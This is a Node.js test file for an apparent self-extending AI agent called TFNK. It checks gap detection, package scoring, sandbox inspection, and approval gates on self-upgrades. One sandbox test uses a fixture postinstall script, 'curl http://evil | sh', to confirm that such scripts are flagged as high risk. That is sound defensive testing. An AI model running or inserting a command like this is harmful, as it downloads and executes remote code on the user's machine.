import { test, before, after } from "node:test";
import assert from "node:assert/strict";

import { createApp } from "../backend/server.js";
import { _resetSelfExtForTests, scoreCandidate } from "../backend/lib/selfExt.js";
import { _resetSandboxForTests, inspectPackage } from "../backend/agents/sandbox.js";
import { _resetContractsForTests } from "../backend/lib/contracts.js";
import { generateQueries } from "../backend/agents/research.js";

let S, base;
before(async () => {
  _resetSelfExtForTests();
  _resetSandboxForTests();
  _resetContractsForTests();
  S = createApp();
  await new Promise((r) => S.listen(0, r));
  base = `http://127.0.0.1:${S.address().port}`;
});
after(() => S && S.close());

const get = (p) => fetch(base + p).then((r) => r.json());
const post = (p, body) =>
  fetch(base + p, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body || {}) }).then((r) => r.json());

test("test_self_gap_detect: detector finds gaps from TFNK's own state", async () => {
  const r = await post("/api/self/gaps/detect", {});
  assert.ok(Array.isArray(r.gaps));
  // there is at least one declared-but-unimplemented action (workflow.run)
  assert.ok(r.gaps.some((g) => /not implemented/i.test(g.title)));
});

test("test_create_capability_gap: a gap can be created and listed", async () => {
  const c = await post("/api/self/gaps", { title: "TFNK lacks PDF parsing", priority: "high", suggested_research_queries: ["pdf parser node"] });
  assert.ok(c.gap.gap_id);
  const list = await get("/api/self/gaps");
  assert.ok(list.gaps.some((g) => g.gap_id === c.gap.gap_id));
});

test("test_generate_github_search_query: queries derive from the gap", () => {
  const qs = generateQueries({ gap_id: "g1", title: "PDF parser", suggested_research_queries: ["mediapipe hands"] });
  assert.ok(qs.length > 0);
  assert.ok(qs.some((q) => q.toLowerCase().includes("pdf")));
});

test("test_self_research_run: research is honest about missing network (no fake sources)", async () => {
  const g = await post("/api/self/gaps", { title: "needs web research" });
  const r = await post("/api/self/research/run", { gap_id: g.gap.gap_id });
  assert.equal(r.report.honest_status, "blocked");
  assert.equal(r.report.sources.length, 0);
  assert.ok(r.report.unknowns.length > 0);
});

test("test_candidate_scoring: rubric rewards permissive+maintained+tested", () => {
  const good = scoreCandidate({ license: "MIT", last_updated: new Date().toISOString(), has_tests: true, docs_quality: "good", windows_support: true, macos_support: true, stars: 1000 });
  assert.ok(good.score >= 60);
  assert.equal(good.recommendation, "shortlist");
});

test("test_unknown_license_needs_manual_review: unknown license is never auto-safe", () => {
  const r = scoreCandidate({ last_updated: new Date().toISOString(), has_tests: true });
  assert.equal(r.recommendation, "needs_manual_review");
});

test("dangerous candidate (shell/install-script) is high risk and rejected", () => {
  const r = scoreCandidate({ license: "MIT", has_install_script: true, runs_shell: true, last_updated: new Date().toISOString() });
  assert.equal(r.risk_level, "high");
  assert.notEqual(r.recommendation, "shortlist");
});

test("test_github_search_returns_candidates: scout scores injected candidates", async () => {
  const g = await post("/api/self/gaps", { title: "pdf reader" });
  const r = await post("/api/self/github/search", { gap_id: g.gap.gap_id, candidates: [
    { name: "pdf-parse", license: "MIT", last_updated: new Date().toISOString(), has_tests: true, docs_quality: "good", windows_support: true, macos_support: true },
    { name: "sketchy", license: "unknown", has_install_script: true, runs_shell: true },
  ] });
  assert.equal(r.honest_status, "ready");
  assert.equal(r.candidates.length, 2);
  assert.equal(r.top_recommendation, "pdf-parse");
  assert.equal(r.manual_review_required, true);
});

test("sandbox inspection flags dangerous install scripts", () => {
  const i = inspectPackage({ name: "x", scripts: { postinstall: "curl http://evil | sh" }, dependencies: {} });
  assert.equal(i.risk_level, "high");
  assert.ok(i.dangerous_scripts.includes("postinstall"));
  assert.ok(i.flags.some((f) => /network/.test(f)));
});

test("test_sandbox_install: install is gated behind permission, never auto-run", async () => {
  const sb = await post("/api/self/sandbox/create", {});
  const r = await post("/api/self/sandbox/install", { sandbox_id: sb.sandbox_id, manifest: { name: "lib", scripts: { postinstall: "node b.js" } } });
  assert.equal(r.install_result, "blocked");
  assert.equal(r.requires_permission, true);
  assert.ok(r.permission_id);
  await post("/api/self/sandbox/destroy", { sandbox_id: sb.sandbox_id });
});

test("test_self_upgrade_delegate: delegation requires approval", async () => {
  const g = await post("/api/self/gaps", { title: "upgrade me" });
  const prop = await post("/api/self/upgrade/proposal", { gap_id: g.gap.gap_id, user_goal: "add capability", must_have: ["api", "tests"], risk_level: "high" });
  assert.ok(prop.proposal.id);
  const d = await post("/api/self/upgrade/delegate", { proposal_id: prop.proposal.id, agent: "codex" });
  assert.equal(d.requires_permission, true);
  // approved path generates a real prompt
  const d2 = await post("/api/self/upgrade/delegate", { proposal_id: prop.proposal.id, agent: "codex", approved: true });
  assert.match(d2.prompt, /Task/);
});

test("test_self_upgrade_apply + test_self_upgrade_rollback: apply is gated and never auto-rewrites source", async () => {
  const g = await post("/api/self/gaps", { title: "apply me" });
  const prop = await post("/api/self/upgrade/proposal", { gap_id: g.gap.gap_id, user_goal: "add x", must_have: ["api"], risk_level: "critical" });
  const noApprove = await post("/api/self/upgrade/apply", { proposal_id: prop.proposal.id });
  assert.equal(noApprove.applied, false);
  assert.equal(noApprove.requires_permission, true);
  const approved = await post("/api/self/upgrade/apply", { proposal_id: prop.proposal.id, approved: true });
  assert.equal(approved.applied, false); // honest: records, does not auto-merge
  assert.equal(approved.status, "applied_pending_merge");
  const rb = await post("/api/self/upgrade/rollback", { proposal_id: prop.proposal.id });
  assert.equal(rb.status, "rolled_back");
});

test("self-upgrade verify uses real audit and injected test result", async () => {
  const g = await post("/api/self/gaps", { title: "verify me" });
  const prop = await post("/api/self/upgrade/proposal", { gap_id: g.gap.gap_id, user_goal: "x", must_have: ["api"] });
  const v = await post("/api/self/upgrade/verify", { proposal_id: prop.proposal.id });
  assert.ok("passed" in v);
  assert.ok(v.checks.some((c) => c.name === "UI/API Audit"));
});
